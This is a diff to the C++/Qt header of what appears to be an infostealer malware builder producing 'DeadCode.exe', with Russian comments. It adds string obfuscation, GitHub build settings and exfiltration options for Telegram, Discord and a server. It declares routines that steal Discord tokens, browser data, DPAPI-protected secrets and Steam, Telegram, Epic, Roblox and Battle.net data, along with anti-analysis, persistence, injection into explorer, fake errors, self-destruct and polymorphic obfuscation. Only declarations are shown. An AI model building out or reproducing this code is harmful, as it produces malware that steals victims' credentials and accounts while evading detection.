@@ -62,6 +62,28 @@ extern std::string CaptureWebSocketSessions(const std::string& processName);
 extern std::string CaptureWebRTCSessions(const std::string& processName);
 extern bool CheckVirtualEnvironment();
 
+// Простая функция для шифрования строк во время компиляции (XOR)
+constexpr char encryptChar(char c, size_t pos) {
+    return c ^ (0xAA + (pos % 0xFF)); // Простое XOR-шифрование с позицией
+}
+
+std::string decryptString(const std::string& encrypted, size_t keyOffset = 0);
+
+// Класс для генерации случайных чисел
+class RandomGenerator {
+public:
+    static RandomGenerator& getGenerator() {
+        static RandomGenerator instance;
+        return instance;
+    }
+
+    std::mt19937& getEngine() { return engine; }
+
+private:
+    RandomGenerator() : engine(std::random_device{}()) {}
+    std::mt19937 engine;
+};
+
 class MainWindow : public QMainWindow
 {
     Q_OBJECT
@@ -113,6 +135,12 @@ public:
         std::string discordWebhook = "";
         std::string filename = "DeadCode.exe";
         std::string iconPath = "";
+        std::string githubToken = "";
+        std::string githubRepo = "";
+        bool sendToTelegram = false;
+        bool sendToDiscord = false;
+        bool sendToServer = false;
+        // Ключи и соль теперь не сохраняются в конфигурации, а генерируются для каждого билда
     } config;
 
     // UI элементы
@@ -121,8 +149,8 @@ public:
     QLineEdit* discordWebhookLineEdit;
     QLineEdit* fileNameLineEdit;
     QLineEdit* iconPathLineEdit;
-    QLineEdit* githubTokenLineEdit;     // Добавлено для GitHub Token
-    QLineEdit* githubRepoLineEdit;      // Добавлено для GitHub Repository
+    QLineEdit* githubTokenLineEdit;
+    QLineEdit* githubRepoLineEdit;
     QComboBox* sendMethodComboBox;
     QComboBox* buildMethodComboBox;
     QCheckBox* steamCheckBox;
@@ -149,7 +177,7 @@ public:
     QTextEdit* textEdit;
     QPushButton* iconBrowseButton;
     QPushButton* buildButton;
-    QPushButton* clearLogsButton;       // Добавлено для кнопки очистки логов
+    QPushButton* clearLogsButton;
     QAction* actionSaveConfig;
     QAction* actionLoadConfig;
     QAction* actionExportLogs;
@@ -167,7 +195,7 @@ public:
     void StealAndSendData(const std::string& tempDir);
 
 signals:
-    void logUpdated(const QString& message);
+    void logUpdated(const QString& message, const QString& type = "info");
     void startStealSignal();
 
 public slots:
@@ -180,15 +208,15 @@ public slots:
 private slots:
     // Слоты для генерации кода и файлов
     void generatePolymorphicCode();
-    void generateJunkCode(); // Добавлено объявление
+    void generateJunkCode();
     void generateBuildKeyHeader();
     void copyIconToBuild();
     void buildExecutable();
 
-    // Новые методы для создания и шифрования билда
+    // Методы для создания и шифрования билда
     std::string generateRandomKey(size_t length);
     std::string generateStubCode(const std::string& key);
-    bool encryptBuild(const std::string& buildPath, const std::string& key);
+    bool encryptBuild(const std::string& buildPath, const std::string& key1, const std::string& key2, const std::string& salt);
     bool compileBuild(const std::string& polymorphicCode, const std::string& junkCode);
 
     // Слоты для GitHub Actions
@@ -200,9 +228,9 @@ private slots:
     void startStealProcess();
     std::string TakeScreenshot(const std::string& dir);
     std::string stealBrowserData(const std::string& dir);
-    std::string StealDiscordTokens(const std::string& dir);
+    std::vector<std::string> StealDiscordTokens();
     std::string StealTelegramData(const std::string& dir);
-    std::string StealSteamData(const std::string& dir);
+    std::vector<std::string> StealSteamData();
     std::string StealEpicGamesData(const std::string& dir);
     std::string StealRobloxData(const std::string& dir);
     std::string StealBattleNetData(const std::string& dir);
@@ -219,24 +247,34 @@ private slots:
     void saveConfig();
     void loadConfig();
     void exportLogs();
-    void appendLog(const QString& message);
+    void appendLog(const QString& message, const QString& type);
 
-    // Новые методы для уникального шифрования и обфускации
+    // Методы для уникального шифрования и обфускации
     void generateEncryptionKeys();
     void obfuscateExecutable(const std::string& exePath);
     void applyPolymorphicObfuscation(const std::string& exePath);
 
+    // Методы для скрытности
+    bool AntiAnalysis();
+    void Stealth();
+    void Persist();
+    void FakeError();
+    void SelfDestruct();
+    bool checkDependencies();
+    bool InjectIntoExplorer();
+
     // Слоты для обработки действий пользователя
     void on_iconBrowseButton_clicked();
     void on_buildButton_clicked();
-    void on_clearLogsButton_clicked();  // Добавлено для очистки логов
+    void on_clearLogsButton_clicked();
 
 private:
     // Приватные методы
     void animateSection(QLabel* sectionLabel, QSpacerItem* spacer);
     QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key);
     QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv);
-    QByteArray decryptDPAPIData(const QByteArray& encryptedData); // Добавлено объявление
+    QByteArray decryptDPAPIData(const QByteArray& encryptedData);
+    std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files);
 
     // Приватные члены
     Ui::MainWindow *ui;
@@ -244,12 +282,13 @@ private:
     QMutex logMutex;
     bool isBuilding;
     QTimer *buildTimer;
-    QTimer *statusCheckTimer;           // Добавлено для проверки статуса GitHub Actions
-    qint64 runId;                       // Добавлено для хранения ID workflow run
-    qint64 artifactId;                  // Добавлено для хранения ID артефакта
-    std::string encryptionKey1;         // Приватное поле для хранения сгенерированного ключа
-    std::string encryptionKey2;         // Приватное поле для хранения сгенерированного ключа
-    std::string encryptionSalt;         // Приватное поле для хранения сгенерированной соли
+    QTimer *statusCheckTimer;
+    QString workflowRunId; // Для хранения ID workflow run
+    qint64 runId;
+    qint64 artifactId;
+    std::string encryptionKey1; // Приватное поле для хранения сгенерированного ключа
+    std::string encryptionKey2; // Приватное поле для хранения сгенерированного ключа
+    std::string encryptionSalt; // Приватное поле для хранения сгенерированной соли
 };
 
 #endif // MAINWINDOW_H
